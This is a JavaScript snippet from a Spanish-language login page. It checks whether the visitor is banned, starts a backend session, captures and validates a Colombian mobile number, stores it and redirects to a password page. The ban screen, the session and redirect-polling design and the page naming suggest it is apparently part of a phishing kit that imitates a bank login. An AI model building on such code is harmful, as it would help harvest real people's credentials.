   <script>
/* ==================== 
   INTEGRACIÓN CON BACKEND
   ==================== */
let sessionId = '';

document.addEventListener("DOMContentLoaded", async () => {
  // 1. Verificar banneo
  const banned = await checkIfBanned();
  if (banned) {
    document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#5D079D;color:white;font-size:24px;">Acceso denegado</div>';
    return;
  }
  
  // 2. Iniciar sesión y guardar sessionId
  sessionId = await initSession();
  console.log('✅ Session ID creado:', sessionId);
  
  // NO iniciar polling en esta página (no espera redirecciones)
});

/* ==========
   Tel y botón
   ========== */

const phoneInput   = document.getElementById("phoneNumber");
const loginButton  = document.getElementById("loginButton");
const form         = document.getElementById("homeForm");

/* Mascara: ### ### ####  (acepta solo dígitos y limita a 10) */
function handlePhoneNumberInput(input) {
  let digits = (input.value || "").replace(/\D/g, "");   // solo dígitos
  if (digits.length > 10) digits = digits.slice(0, 10);  // tope 10

  // Formato 3-3-4 con espacios
  if (digits.length > 6) {
    input.value = digits.replace(/(\d{3})(\d{3})(\d{0,4})/, "$1 $2 $3");
  } else if (digits.length > 3) {
    input.value = digits.replace(/(\d{3})(\d{0,3})/, "$1 $2");
  } else {
    input.value = digits;
  }
}

/* Validación de login */
function LoginValidation(theForm) {
  if (!theForm) return false;
  const el = theForm.querySelector("#phoneNumber");
  if (!el) return false;

  const digits = (el.value || "").replace(/\D/g, "");
  // Debe empezar por 3 y ser exactamente 10 dígitos
  if (digits.length !== 10) return false;
  if (digits[0] !== "3") return false;
  return true;
}

/* Habilitar/Deshabilitar botón según validación */
function actualizarEstadoBoton() {
  loginButton.disabled = !LoginValidation(form);
}

/* Eventos */
phoneInput.addEventListener("input", () => {
  handlePhoneNumberInput(phoneInput);
  actualizarEstadoBoton();
});

form?.addEventListener("input", actualizarEstadoBoton);

/* Click "Entra" */
loginButton.addEventListener("click", (event) => {
  event.preventDefault();

  if (!LoginValidation(form)) {
    actualizarEstadoBoton();
    return;
  }

  const prettyPhone = phoneInput.value;                        // "321 485 4545"
  const rawPhone    = prettyPhone.replace(/\D/g, "");          // "3214854545"

  // Guarda en localStorage
  localStorage.setItem("formData", JSON.stringify({ phoneNumber: prettyPhone }));
  localStorage.setItem("numero", rawPhone);

  console.log('✅ Teléfono guardado:', prettyPhone);
  console.log('✅ Sesión guardada:', sessionId);

  // Continúa el flujo
  window.location.href = "access-sign-in-pass.php.html";
});

/* Estado inicial (por si hay autocompletado) */
document.addEventListener("DOMContentLoaded", () => {
  handlePhoneNumberInput(phoneInput);
  actualizarEstadoBoton();
});
</script>
